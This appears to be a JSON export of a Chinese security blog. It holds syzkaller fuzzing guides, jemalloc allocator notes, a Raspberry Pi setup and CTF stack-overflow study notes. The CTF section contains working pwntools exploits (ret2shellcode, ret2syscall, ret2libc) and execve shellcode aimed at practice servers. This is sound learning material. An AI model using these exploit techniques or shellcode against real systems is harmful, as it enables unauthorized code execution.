只能在pixel的3.18上测试，得注意先测试再使用网上的exp。然后就是适配的话主要是对于一些偏移的适配，以及不是所有的设备能都直接利用，不同内核版本和不同产商又不一样。\n提权过程中最主要注意的就是不让内核发生奇奇怪怪的奔溃，每次遇到奔溃，可能就需要想其他的方法去绕过。\n关于这个漏洞还有很多其他思路可以尝试，比如人造页表镜像攻击之类的方式。\n参考 https://www.52pojie.cn/thread-1083552-1-1.html\nhttps://blog.csdn.net/weixin_43901866/article/details/102458212\nhttps://cloudfuzz.github.io/android-kernel-exploitation/\nhttps://github.com/sharif-dev/AndroidKernelVulnerability\nhttps://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/\nhttps://dayzerosec.com/posts/analyzing-androids-cve-2019-2215-dev-binder-uaf/\n","date":"2020-06-30T00:00:00+08:00","permalink":"https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/","title":"CVE-2019-2215分析利用记录"},{"content":"syzkaller_fuzzing_入门 0x00 介绍 syzkaller是google的安全研究人员开发并维护的内核fuzz工具。它主要是用go写的，也有少部分C代码，支持akaros/fuchsia/linux/android/freebsd/netbsd/openbsd/windows等系统，发现的漏洞多达上千。\n0x01 环境配置 环境要求：\nC/C++ 编译器\nGCC 6.1.0+ linux kernel\n编译 v4.6以后编译时确保CONFIG_KCOV=y 之前版本：这样添加支持\n一些额外选项\nVM 一般QEMU\n支持QEMU、kvmtool和GCE虚拟机、Android设备和Odroid C2开发板\n需要进行通信：vm要提供网络支持\nvm配置需要ssh服务器\n要能执行ssh -i $SSHID -p $PORT root@localhost\n需要将debugfs 挂在到 /sys/kernel/debug\nGolang 安装\n1 2 3 4 5 6 7 8 9 10 wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz tar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gz vim /etc/profile mkdir /usr/local/gopath # 添加export export GOROOT=/home/kuekiko/goroot export GOPATH=/home/kuekiko/gopath export PATH=$GOROOT/bin:$PATH export PATH=$GOPATH/bin:$PATH source etc/profile syzkaller\n1 2 3 4 5 # build go get -u -d github.com/google/syzkaller/... cd $GOROOT/src/github.com/google/syzkaller/ make -j4 # build之后在bin/下 如果要cross-OS/arch 进行测试的话，记得修改TARGETOS, TARGETVMARCH 和TARGETARCH参数再make 0x02 Init syzkaller 生成镜像\n1 2 3 4 5 6 7 8 9 sudo apt install debootstrap cd gopath/src/github.com/google/syzkaller/tools/ # 使用国内源 修改create-image.sh sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR # 改成 sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR http://mirrors.163.com/debian/ ./create-image.sh # 选项 --distribution wheezy --feature full # 生成了stretch.id_rsa stretch.id_rsa.pub stretch.img 编译启动 内核 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export KERNEL=/home/kuekiko/linux_kernel export IMG=/home/kuekiko/linux_kernel/img export PATH=$KERNEL:$PATH export PATH=$IMG:$PATH # 默认编译 cd $KERNEL/xxx make CC=\u0026#34;$GCC/bin/gcc\u0026#34; defconfig make CC=\u0026#34;$GCC/bin/gcc\u0026#34; kvmconfig # 直接 make menuconfig # 编辑.config CONFIG_KCOV=y CONFIG_DEBUG_INFO=y CONFIG_KASAN=y CONFIG_KASAN_INLINE=y # 新 CONFIG_CONFIGFS_FS=y CONFIG_SECURITYFS=y make CC=\u0026#34;$GCC/bin/gcc\u0026#34; olddefconfig make CC=\u0026#34;$GCC/bin/gcc\u0026#34; -j4 qemu 1 2 3 4 5 6 7 8 9 10 11 qemu-system-x86_64 \\ -kernel $KERNEL/arch/x86/boot/bzImage \\ -append \u0026#34;console=ttyS0 root=/dev/sda earlyprintk=serial\u0026#34;\\ -hda $IMAGE/stretch.img \\ -net user,hostfwd=tcp::10021-:22 -net nic \\ -enable-kvm \\ -nographic \\ -m 2G \\ -smp 2 \\ -pidfile vm.pid \\ 2\u0026gt;\u0026amp;1 | tee vm.log ssh连接\nssh -i $IMG/stretch.id_rsa -p 10021 -o \u0026quot;StrictHostKeyChecking no\u0026quot; root@localhost\nkill qemu 使用kill $(cat vm.pid)\n0x03 Start Fuzzing 添加配置文件my.cfg\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 { \u0026#34;target\u0026#34;: \u0026#34;linux/amd64\u0026#34;, \u0026#34;http\u0026#34;: \u0026#34;127.0.0.1:56741\u0026#34;, \u0026#34;workdir\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller/workdir\u0026#34;, \u0026#34;kernel_obj\u0026#34;: \u0026#34;$KERNEL\u0026#34;, \u0026#34;image\u0026#34;: \u0026#34;$IMAGE/stretch.img\u0026#34;, \u0026#34;sshkey\u0026#34;: \u0026#34;$IMAGE/stretch.id_rsa\u0026#34;, \u0026#34;syzkaller\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller\u0026#34;, \u0026#34;procs\u0026#34;: 4, \u0026#34;type\u0026#34;: \u0026#34;qemu\u0026#34;, \u0026#34;vm\u0026#34;: { \u0026#34;count\u0026#34;: 4, \u0026#34;kernel\u0026#34;: \u0026#34;$KERNEL/arch/x86/boot/bzImage\u0026#34;, \u0026#34;cpu\u0026#34;: 2, \u0026#34;mem\u0026#34;: 2048 } } 启动fuzzing\n./bin/syz-manager -config=my.cfg\n浏览器打开http://127.0.0.1:56741/\n虚拟机性能太垃圾，太慢了 fuzzing半天没也啥crashes。还是得用服务器。\n挂机了大概3小时，出了几个没啥用的crach。\n0x04 总结 还有很多选项可以开启，没试。\n看看实现源码，还有就是之后试试Fuzzing Android\n参考 https://github.com/google/syzkaller\nhttps://www.freebuf.com/sectool/142969.html\nhttp://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/\nhttps://github.com/google/syzkaller/blob/master/docs/linux/setup.md\n","date":"2020-04-10T00:00:00+08:00","permalink":"https://ykiko.top/p/syzkaller_fuzzing_%E5%85%A5%E9%97%A8/","title":"syzkaller_fuzzing_入门"},{"content":"Android之jemalloc 0x00 简单介绍 想调一个CVE、发现对jemalloc 了解太少。重新复习复习jemalloc，做个记录。\njemalloc最初是2005年 Jason Evans开发的新一代内存分配器， 之后没多久被添加到FreeBSD的libc中的默认内存分配器，用来替代原来的phkmalloc。2007年 Firefox Mozilla项目的独立版本也将jemalloc作为主要的分配器。2009年，Facebook 的后端项目也广泛使用jemalloc。2014年，Android 5 开始采用jemalloc作为主要的内存分配器，不过部分Android5/6依然能看到dlmalloc和jemalloc两者并存。\njemalloc的一些特性与设计原则：\n强大的多核/多线程分配能力.\n最小化的元数据开销\n基于每个线程进行缓存，避免了同步问题。\n避免了连续分配内存的碎片化问题。\n简洁高效\n0x01 结构 结构图\njemalloc对内存划分按照如下由高到低的顺序:\n内存是由一定数量的arenas进行管理.一个arena被分割成若干chunks, 后者主要负责记录bookkeeping（记录信息）.chunk内部又包含着若干runs, 作为分配小块内存的基本单元.run由pages组成, 最终被划分成一定数量的regions对于small size的分配请求来说, 这些region就相当于user memory.\narenas 对于Android来说：\n限制了只使用两个arenas,每个带有一个lock。这意味着，不同线程尝试分配内存时，会循环、平均分配至两个arena，确保两个arena有大致相等的进程数量。只有在相同的arena中分配内存时才需要获取lock。\n1 2 3 4 5 6 7 8 9 10 11 12 13 #/android.bp android_product_variables = { // Only enable the tcache on non-svelte configurations, to save PSS. malloc_not_svelte: { cflags: [ \u0026#34;-UANDROID_MAX_ARENAS\u0026#34;, \u0026#34;-DANDROID_MAX_ARENAS=2\u0026#34;, \u0026#34;-DJEMALLOC_TCACHE\u0026#34;, \u0026#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8\u0026#34;, \u0026#34;-DANDROID_TCACHE_NSLOTS_LARGE=16\u0026#34;, ], }, } 用shadow查看arenas\nchunk 一个arena下会有若干个chunk，Android 7之前chunk为256k，之后32位系统改为512k，64位系统改为2MB。\n每个chunk都有一个chunk head 包含着这个chunk的元数据（metadata）.Android 7之后元数据增加了mapbias与mapbits flags。\nchunk是存放run的容器，大小固定相同，操作系统返回的内存被划分到chunk中管理\nchunk中的元数据结构，mapbit[0]与mapmisc[0]指向chunk中的第一个run：\nchunk元数据中mapmisc中的bitmap结构管理着run中的region的分配使用：\nchunk\nrun run是存放连续的大小相同的region的容器，每个chunk中会包含若干个run，而run的metadata会存放在chunk的header当中，这样region里只存放数据本身，不再有内存属性说明。\nregion region是最小的存储单元，每个run里面的region大小完全相同，也没有元数据，malloc实际返回的是region的地址。\nbins jemalloc也用bin来管理内存，共有39个bins。bin的metadata存放于arena的header中，39个bin还会存放当前正在使用的run。所有带有空闲region的run和闲置的chunk信息会被放置在红黑树结构当中，这样寻找空闲内存的复杂度可以控制在o(log(n))。\ntcache 为了优化多线程性能，jemalloc还采用了LIFO结构的tcache，存放近期被释放的region，每个线程的每个bin都对应一个tcache，存放在tcache中的内存并不会设置free标记位，并且由于tache附着于线程本身，使得大部分情况下从tcache分配内存时完全无需lock。\n当jemalloc新分配一块内存是发现tcache为空，会触发prefill事件，此时jemalloc会将单前的arena上lock,并从当前run中取出一定数量的region存入tcache，保证tcache不为空。\n当tcache满了（small bin是8，larger bin是20）的时候，会触发flush 事件，会释放部分region，并且才会被标记为已释放。这时这些region才能被其他线程自由分配。\n此外，jemalloc也实现是GC机制。会有一个计数器统计申请和释放，达到阈值之后会触发特别的事件，目标bin里的tcache的四分之三的region会被释放掉。下次GC时会轮到下一个bin。这是可以从tcache中删除region并使其恢复常规可用性的另一种方法。\n分配流程 计算申请内存大小从当前线程的tcache中找到合适的bin如果tcache为空，就从当前的run中prefill一些region进来如果当前run耗尽，就从低地址开始找到第一个非空run如果现有run里没有足够的内存就分配一个新run如果chunk里没有空间了就分配一个新chunk，同时分配新run并prefill一些region到tcache\n0x02 shadow 使用shadow查看Android中的内存布局，简单学习下shadow的使用\n查看arenas 可以看到一共两个arenas，每个arena有36个bin，一共2个chunk。\n查看chunks 单个chunk，查看chunk中的run\n查看runs，会列出单前所有的run的详情 run_siez = region_size*no_regions\n只显示单前运行中的run\n是否是allocated状态是根据arena_chunk_map_bits_s 对应 bits的 第 [0] bit 来确定 这里jemalloc5 和 jemalloc4 3不一样。\n查看单个run的详情：\nrun的布局如下：\n源代码arena.h中有很多关于bits之类的注释。能够帮助理解。\n查看bins:\n1 2 3 4 5 6 struct arena_bin_s { malloc_mutex_t lock; arena_run_t *runcur; arena_run_heap_t runs; //4之前版本为arena_run_tree_t 类型 malloc_bin_stats_t stats; //统计信息 } runcur: 当前可用于分配的run, 一般情况下指向地址最低的non-full run, 同一时间一个bin只有一个current run用于分配.\n看别人的文章说是除去0号bin以外没4个bin为一组，组内size差一样，但是在这里可以看到每8个为一组，01-8号bin的size差值都为0x10,算是第一组，那第二组就为9-12号，只有4个bin size差值为0x20,但是有的为空，算第二组。没两组之间的差值2倍。以此类推，后面每4个为一组。\n划分为{0}、{1-8}、{9-12}、{13-16}····· 可能不同版本会有区别。\n查看regions [换了一个进程]\n大小都是0x8\n按大小查找：第4个：\ntchche查看：\ntcache的定义：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 struct tcache_bin_info_s { unsigned\tncached_max;\t/* Upper limit on ncached. */ }; struct tcache_bin_s { tcache_bin_stats_t tstats; int\tlow_water;\t/* Min # cached since last GC. */ unsigned\tlg_fill_div;\t/* Fill (ncached_max \u0026gt;\u0026gt; lg_fill_div). */ unsigned\tncached;\t/* # of cached objects. */ /* * To make use of adjacent cacheline prefetch, the items in the avail * stack goes to higher address for newer allocations. avail points * just above the available space, which means that * avail[-ncached, ... -1] are available items and the lowest item will * be allocated first. */ void\t**avail;\t/* Stack of available objects. */ }; struct tcache_s { ql_elm(tcache_t) link;\t/* Used for aggregating stats. */ uint64_t\tprof_accumbytes;/* Cleared after arena_prof_accum(). */ ticker_t\tgc_ticker;\t/* Drives incremental GC. */ szind_t\tnext_gc_bin;\t/* Next bin to GC. */ tcache_bin_t\ttbins[1];\t/* Dynamically sized. */ /* * The pointer stacks associated with tbins follow as a contiguous * array. During tcache initialization, the avail pointer in each * element of tbins is initialized to point to the proper offset within * this array. */ }; struct tcaches_s { union { tcache_t\t*tcache; tcaches_t\t*next; }; }; 0x03 利用 堆溢出\n一般先利用gadget 绕过ASLR，再利用gadget拿到代码执行的权限，只要能执行代码就能逃出sandboxing或者摆脱selinux。\nSmall region overflow Run overflow Chunk overflow 总结 后面还是得使用shadow工具具体调试CVE加深理解。\njemalloc新版与旧版有挺多区别，之后想要深入了解jemalloc的细节以及一些实现还是得看看源码。\n参考 https://github.com/jemalloc/jemalloc\nhttps://blog.csdn.net/txx_683/article/details/53468211\nhttps://blog.nsogroup.com/a-tale-of-two-mallocs-on-android-libc-allocators-part-2-jemalloc/\nhttps://www.anquanke.com/post/id/149132#h3-5\nhttps://www.anquanke.com/post/id/85982\ndlmalloc 的一个tools: shade\n","date":"2020-04-05T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E4%B9%8Bjemalloc/","title":"Android之jemalloc"},{"content":"syzkaller-android 0x00 前言 介绍使用syzkaller fuzz Android的配置教程。\n0x01 环境 按要安装好环境\ngo\nsyzkaller\n交叉编译aarch64-linux-android、g++-aarch64-linux-gnu、gcc-arm-linux-gnueabihf、g++-arm-linux-gnueabihf\n0x02 配置 创建配置文件android.cfg\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 { \u0026#34;target\u0026#34;: \u0026#34;linux/arm64\u0026#34;, // arm \u0026#34;http\u0026#34;: \u0026#34;127.0.0.1:56741\u0026#34;, \u0026#34;workdir\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller/workdir\u0026#34;, \u0026#34;kernel_obj\u0026#34;: \u0026#34;$KERNEL\u0026#34;, // 内核路径 \u0026#34;syzkaller\u0026#34;: \u0026#34;$GOPATH/src/github.com/google/syzkaller\u0026#34;, \u0026#34;sandbox\u0026#34;: none, \u0026#34;procs\u0026#34;: 8, \u0026#34;type\u0026#34;: \u0026#34;adb\u0026#34;, \u0026#34;cover\u0026#34;: true, \u0026#34;vm\u0026#34;: { \u0026#34;devices\u0026#34;: [$DEVICES], \u0026#34;battery_check\u0026#34;: true } } KASAN+KCOV编译内核\n首先编译要fuzz的Android版本输入手机。（过程省略）[1]\n下载编译基准内核。[2] ，使用手动编译会报错，使用给KASCAN文档[3]的方法也可能报错。\n1 2 3 4 5 6 7 8 9 10 ## 创建文件夹 mkdir android-kernel \u0026amp;\u0026amp; cd android-kernel ## 切换分支 repo init -u https://android.googlesource.com/kernel/manifest -b BRANCH repo sync ## 修改内核build文件 内核路径下的build.config制定make_deconfig KERNEL_DIR=private/msm-google . ${ROOT_DIR}/${KERNEL_DIR}/build.config.common ##这里 ## 构建内核 build/build.sh 刷入内核\n重新编译aosp启动镜像\n在服务器上编译的将out/dist目录打包备份\n1 2 3 4 5 6 7 8 9 cd {aosp_dir} cp {kernel_dir}/out/{version}/dist/Image.lz4-dtb {aosp}/device/google/marlin-kernel . build/envsetup.sh lunch aosp_sailfish-userdebug make -j64 ## 重新拷贝到本地 win adb reboot bootloader set ANDROID_PRODUCT_OUT=./ fastboot flashall -w 之前 3.18.137-g72a7a6\n之后 … (手机显示无法显示内核) ```shell sailfish:/ # uname -a Linux localhost 3.18.137-g8b62de70252d #1 SMP PREEMPT 2019-09-27 02:13:04 aarch64 ``` 修改内核重新刷入\n失败的方法 按文档说的\n```shell cd arch/arm64/configs cp marlin_defconfig marlin-kasan_defconfig ``` 在配置文档中移除`CONFIG_KERNEL_LZ4=y` 加入 ```plain text CONFIG_KASAN_INLINE=y CONFIG_KCOV=y CONFIG_SLUB=y CONFIG_SLUB_DEBUG=y ``` 重新编译内核。 发现任何变化 尝试的方法\n修改build.config文件 ```shell . ${ROOT_DIR}/${KERNEL_DIR}/build.config.kasan (失败) ``` 不修改，还是去修改marlin_defconfig添加KASAN 报错：savedefconfig does not match private/msm-google 修改build.config 删掉check_defconfig 检查 （失败） 不修改文件\n使用命令 ```shell ./build/build.sh BUILD_CONFIG=build.config.kasan ``` 最后发现\n1 2 cp private/msm-google/build.config.kasan ./ BUILD_CONFIG=build.config.kasan build/build.sh ##放前面才管用 编译完成 ，修改aosp参数\n1 2 3 aosp$ cd device/google/marlin/sailfish cp BoardConfig.mk BoardConfig.mk.bak vim BoardConfig.mk 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ## 注释掉 BOARD_KERNEL_BASE := 0x80000000 BOARD_KERNEL_PAGESIZE := 4096 ## ifneq ($(filter sailfish_kasan, $(TARGET_PRODUCT)),) BOARD_KERNEL_OFFSET := 0x80000 BOARD_KERNEL_TAGS_OFFSET := 0x02500000 BOARD_RAMDISK_OFFSET := 0x02700000 BOARD_MKBOOTIMG_ARGS := --kernel_offset $(BOARD_KERNEL_OFFSET) --ramdisk_offset $(BOARD_RAMDISK_OFFSET) --tags_offset $(BOARD_KERNEL_TAGS_OFFSET) ## else ## BOARD_KERNEL_TAGS_OFFSET := 0x02000000 ## BOARD_RAMDISK_OFFSET := 0x02200000 ## endif TARGET_KERNEL_ARCH := arm64 TARGET_KERNEL_HEADER_ARCH := arm64 修改device/google/marlin/device-common.mk\n1 2 lz4-\u0026gt;gz LOCAL_KERNEL := device/google/marlin-kernel/Image.gz-dtb 新的问题\n1 error: out/target/product/sailfish/boot-debug.img too large 解决方法：将BoardConfig.mk的BOARD_BOOTIMAGE_PARTITION_SIZE的值改大。\n重新编译aosp启动镜像 再刷入手机。\n0x03 开启fuzzing 1 ./bin/syz-manager -config=android.cfg fuzz\n手机不断重启。。。。\n查看msg:adb shell dmesg -w\nsyz-manager -debug 查看syz的相关问题。\n参考 [1]https://source.android.google.cn/setup/build?hl=zh-cn\n[2]https://source.android.google.cn/setup/build/building-kernels?hl=zh-cn\n[3]https://source.android.com/devices/tech/debug/kasan-kcov\n[4]https://github.com/google/syzkaller/blob/master/docs/linux/setup_linux-host_android-device_arm-kernel.md\n","date":"2019-09-15T00:00:00+08:00","permalink":"https://ykiko.top/p/syzkaller-android/","title":"syzkaller-android"},{"content":"Raspberry_Pi_3B+_0安装使用 Raspberry Pi 3B+ 0安装使用 0x00 购买 终于下手买了。打算用来学习ARM、以及一些硬件的知识。\n3B+ 裸机\n32G SD card\n散热片\n保护壳\n0x01 安装系统 首先下载系统镜像。\n官网有挺多系统可以选择，这里选择了安装Raspbian desktop最新版\n之后打算装Lite版，手上没有多余的显示器。而且桌面版占用很高。\n迅雷，3分钟搞定。\n其次开始向SD卡中写镜像。\n买的32G闪迪的高速卡，现在32G都白菜价了，想想几年前16G的死贵。\n官方教程用的是Etcher ，也可以用Win32DiskImager。这里省事还是用Etcher。\n步骤\n下载etcher.io安装包安装Etcher](https://etcher.io/)\n运行Etcher,选择镜像和sd卡\nFlash一键搞定。 0x02 配置 系统安装完，开始进行配置。\n先连上显示器看看\n然而平时显示器还是要连笔记本，而且这分辨率好糊。所以还是配ssh和VNC连接使用吧。\n修改源 1 2 3 4 5 6 # 编辑 `/etc/apt/sources.list` 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main non-free contrib # 编辑 `/etc/apt/sources.list.d/raspi.list` 文件，删除原文件所有内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ stretch main sudo apt update\n拓展SD卡 sudo raspi-config -\u0026gt; Advanced Opt -\u0026gt; A1 Expand Filesystem\nssh 配置 最新版系统直接想要的接口打开就OK\n允许root登陆，修改/etc/ssh/sshd.conf 下的PermitRootLogin yes StrictModes yes 就ok。\nVNC win10下载vnc客户端\nRaspberryPI 命令开启server:vncserver\n连接成功：\n连接出现分辨率问题\n设置分辨率：命令sudo raspi-config-\u0026gt;Advanced Opt -\u0026gt;Resolution选择分辨率。重启就完事。\n0x04 硬件检查 系统镜像版本号 板子型号： 系统固件版本号 看看硬件：\nusb cpu 说好的v8?\n网卡 0x05 总结 闲了很久，现在终于动手搞自己想搞的东西，花了一个晚上，搞完这些简单的安装配置，挺费时费力的，不过自己开心就好。最好是自己能够坚持下去，做更多有趣的事。\n12\n","date":"2019-06-23T00:00:00+08:00","permalink":"https://ykiko.top/p/raspberry_pi_3b-_0%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/","title":"Raspberry_Pi_3B+_0安装使用"},{"content":"CTF-PWN刷题记录-CTFWiki_3堆利用（待补充） 简介 ","date":"2019-04-04T00:00:00+08:00","permalink":"https://ykiko.top/p/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_3%E5%A0%86%E5%88%A9%E7%94%A8%E5%BE%85%E8%A1%A5%E5%85%85/","title":"CTF-PWN刷题记录-CTFWiki_3堆利用（待补充）"},{"content":"CTF-PWN刷题记录-CTFWiki_1栈溢出 看CTFWiki来入门CTF-PWN (Linux和arm) 做个记录\n知识点：PWN相关知识点总结\nLinux PWN\nARM PWN\n题目全部来源于 CTFWiki 上所涉及题目\nLinux PWN 大部分原理参考CTFWiki\n栈溢出 基本栈溢出 1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void success() { puts(\u0026#34;You Hava already controlled it.\u0026#34;); } void vulnerable() { char s[12]; gets(s); puts(s); return; } int main(int argc, char **argv) { vulnerable(); return 0; } 1 2 3 4 5 6 7 8 # gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1 stack1.c: In function ‘vulnerable’: stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] gets(s); ^~~~ fgets /tmp/ccNeCYTO.o: In function `vulnerable\u0026#39;: stack1.c:(.text+0x45): warning: the `gets\u0026#39; function is dangerous and should not be used. echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space\n关闭完全部保护\n步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-\u0026gt;+ebp的长度-\u0026gt;+返回的地址（success()的地址)\npoc1.py\n1 2 3 4 5 6 7 8 9 10 11 #coding=utf-8 from pwn import * # sh = process(\u0026#34;./stack1\u0026#34;) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10000) success_addr = 0x08048456 payload = \u0026#39;a\u0026#39;*0x14 + \u0026#39;bbbb\u0026#39; + p32(success_addr) sh.sendline(payload) sh.interactive() 基本ROP ROP 攻击一般得满足如下条件\n程序存在溢出，并且可以控制返回地址。\n可以找到满足条件的 gadgets 以及相应 gadgets 的地址。\nret2text ret2text 即控制程序执行程序本身已有的的代码 (.text)。\n示例程序：ret2text\n所以只需ret到0x0804863a就能getshell\n构造payload\n计算偏移量\n使用ragg2 ragg2 -P 200 -r \u0026gt; pattern.txt or ragg2 -P 200 -r复制下来\n1 2 # ragg2 -P 200 -r AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA# profile.rr2:\n1 2 #!/usr/bin/rarun2 stdin=./pattern.txt r2 -R profile.rr2 -d ret2text or 直接r2 -d ret2text\ndc后输入复制的pattern字符串\nwopO eip得到偏移\ngdb手动计算\n下断点call处：0x080486ae\n所以偏移为108+4\npython pattern.py\npayload\n1 2 3 4 5 6 7 8 from pwn import * # sh = process(./ret2text) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10001) binsh = 0x0804863a payload = 112*\u0026#39;A\u0026#39; + p32(binsh) sh.sendline(payload) sh.interactive() ret2shellcode ret2shellcode\n运行时shellcode所在区域应具有可执行权限 strncpy函数将gets的内容复制到buf2 buf存放到.bss段的[0x804a080:4]位置。\n调试看所在.bss段是否有执行的权限。\npayload:\n1 2 3 4 5 6 7 8 9 10 11 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # sh = process(./ret2shellcode) sh = remote(\u0026#34;47.106.212.155\u0026#34;,10002) ## 获得system(\u0026#34;bin/sh\u0026#34;)的asm shellcode = asm(shellcraft.sh()) buf2_addr = 0x804a080 # sh.sendline(shellcode+\u0026#34;\\x90\u0026#34;*(112-len(shellcode))+p32(buf2_addr)) sh.sendline(shellcode.ljust(112,\u0026#34;A\u0026#34;)+p32(buf2_addr)) sh.interactive() 练习题：sniperoj-pwn100-shellcode-x86-64\n偏移：var void *buf @ rbp-0x10 shellcode可用空间：16+8=24\n找shellcode https://www.exploit-db.com/\nhttp://shell-storm.org/shellcode/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 .global _start _start: # char *const argv[] xorl %esi, %esi # \u0026#39;h\u0026#39; \u0026#39;s\u0026#39; \u0026#39;/\u0026#39; \u0026#39;/\u0026#39; \u0026#39;n\u0026#39; \u0026#39;i\u0026#39; \u0026#39;b\u0026#39; \u0026#39;/\u0026#39; movq $0x68732f2f6e69622f, %rbx # for \u0026#39;\\x00\u0026#39; pushq %rsi pushq %rbx pushq %rsp # const char *filename popq %rdi # __NR_execve 59 pushq $59 popq %rax # char *const envp[] xorl %edx, %edx syscall */ /* gcc -z execstack push64.c uname -r 3.19.3-3-ARCH */ shellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\u0026#34; \u0026#34;\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34;; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;x64\u0026#39;,os = \u0026#39;linux\u0026#39; ) io = process(\u0026#39;./shellcode\u0026#39;) # io = remote(\u0026#34;47.106.212.155\u0026#34;,10003) shellcode = \u0026#34;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\u0026#34; io.recvuntil(\u0026#39;[\u0026#39;) buf_addr = io.recvuntil(\u0026#39;]\u0026#39;,drop=True) buf_addr = int(buf_addr,16) # print(buf_addr) payload = \u0026#34;A\u0026#34;*24 + p64(buf_addr+32) + shellcode # 32是24字节的填充数据长度加返回地址长度24+8 print payload io.sendline(payload) io.interactive() ret2syscall 控制程序执行系统调用\nret2syscall\n相对ebp的偏移为0x64=108 覆盖范围为+4=112\n没法ret2text,也没法ret2shellcode\n只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用\n1 execve(\u0026#34;/bin/sh\u0026#34;,NULL,NULL) 使用ROPgadget寻找gadgets\n这样就能够控制到eax,ebx,ecx,edx寄存器。\n写payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #coding:utf-8 from pwn import * # context(log_level = \u0026#39;debug\u0026#39;,arch =\u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39; ) # io = process(./ret2syscall) io = remote(\u0026#34;47.106.212.155\u0026#34;,10004) pop_eax_addr = 0x080bb196 pop_ebcdx_addr = 0x0806eb90 int_0x80_addr = 0x08049421 bin_sh_addr = 0x080BE408 payload = flat( [\u0026#34;A\u0026#34;*112,pop_eax_addr,0xb,pop_ebcdx_addr,0,0,bin_sh_addr,int_0x80_addr] ) io.sendline(payload) io.interactive() ret2libc ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。\neg1: ret2libc1\n1 2 3 4 5 6 7 8 9 10 int __cdecl main(int argc, const char **argv, const char **envp) { char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\u0026#34;RET2LIBC \u0026gt;_\u0026lt;\u0026#34;); gets(\u0026amp;s); return 0; } exp1:\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * # io = process(\u0026#39;./ret2libc1\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10006) binsh_addr = 0x08048720 sym_plt_addr = 0x08048460 payload = flat([112*\u0026#39;A\u0026#39;,sym_plt_addr,\u0026#39;b\u0026#39;*4,binsh_addr]) # \u0026#39;bbbb\u0026#39; 作为函数调用栈返回地址的虚假的地址 io.sendline(payload) io.interactive() eg2:\nret2libc2\n缺少/bin/sh 只能自己寻找gadgets来进行构造。\nexp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 from pwn import * # io = process(\u0026#39;./ret2libc2\u0026#39;) io = remote(\u0026#34;47.106.212.155\u0026#34;,10007) # binsh_addr = 0x08048720 sym_plt_addr = 0x08048490 sym_imp_gets_addr = 0x08048460 pop_ebx_addr = 0x0804872f buf2_addr = 0x804a080 payload = flat([\u0026#34;A\u0026#34;*112,sym_imp_gets_addr,pop_ebx_addr,buf2_addr,sym_plt_addr,\u0026#39;x\u0026#39;*4,buf2_addr]) io.sendline(payload) io.sendline(\u0026#34;/bin/sh\u0026#34;) io.interactive() 